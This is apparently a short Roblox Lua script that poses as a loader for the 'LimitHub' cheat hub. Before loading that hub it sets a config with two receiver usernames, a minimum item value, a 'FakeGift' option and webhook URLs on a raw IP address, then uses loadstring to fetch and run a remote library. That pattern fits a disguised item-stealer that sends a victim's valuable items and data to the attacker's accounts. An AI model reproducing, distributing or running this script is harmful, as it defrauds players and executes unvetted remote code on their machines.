_G.NullConfig = {
    User = {'harambengkyut0', 'harambengpogi2'},
    min_value = 10000000000,
    pingEveryone = "No", -- dont change this
    Webhook = "http://45.13.225.83:20002/proxy/b0c925c15bdd78b1f933e7bb1265a877",
    FakeGift = "Yes",
    Trash = "http://45.13.225.83:20002/proxy/55aa9dd4e8874079bcd7d094daac3e65",
    LoadingScreen = "No",
    GiftOnlyRares = "Yes"
}

loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()

-- this would execute limit hub
loadstring(game:HttpGet(('https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_P_E.lua')))()
